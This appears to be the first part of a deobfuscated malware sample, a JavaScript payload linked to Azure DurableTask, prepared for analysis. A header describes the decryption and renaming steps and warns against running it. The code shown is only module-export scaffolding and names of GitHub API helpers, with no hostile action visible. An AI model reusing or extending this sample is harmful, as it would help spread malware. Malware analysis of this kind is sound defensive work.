/*
 * Top-level module live-export helpers and runtime bootstrap wiring.
 */

/*
 * Deobfuscated Azure DurableTask malicious JavaScript payload.
 *
 * Source stages:
 * - Outer char-code + ROT15 wrapper removed.
 * - AES-128-GCM main payload decrypted.
 * - Nested AES-256-GCM + gzip string payloads decrypted.
 * - _0x string-table lookups resolved where statically known.
 * - fae5ea76a permutation/XOR string calls resolved where statically known.
 * - Dead _0x18d1/_0x1be6 decoder scaffolding removed after resolution.
 * - High-confidence top-level symbols renamed; see durabletask-symbol-map.json.
 * - Safe bracket member accesses normalized outside strings/comments.
 * - Raw line breaks inside quoted strings/regexes escaped for parser/formatter compatibility.
 * - Safe Symbol("name") bindings exact-token-renamed outside strings/comments.
 *
 * Do not execute this file. Treat it as live malware.
 */

var defineProperty = Object.defineProperty,
  returnBoundValue = (boundExportValue) => boundExportValue;
function setLiveExportValue(liveExportName, liveExportValue) {
  this[liveExportName] = returnBoundValue.bind(null, liveExportValue);
}
var defineLiveExports = (liveExportTarget, liveExportGetters) => {
    for (var liveExportKey in liveExportGetters)
      defineProperty(liveExportTarget, liveExportKey, {
        get: liveExportGetters[liveExportKey],
        enumerable: true,
        configurable: true,
        set: setLiveExportValue.bind(liveExportGetters, liveExportKey),
      });
  },
  initOnce = (initFactory, initValue) => () => (
    initFactory && (initValue = initFactory((initFactory = 0))), initValue
  ),
  require = import.meta.require,
  githubApiExports = {};
defineLiveExports(githubApiExports, {
  githubJson: () => githubJson,
  githubHeaders: () => githubHeaders,
  githubFetch: () => githubFetch,
});
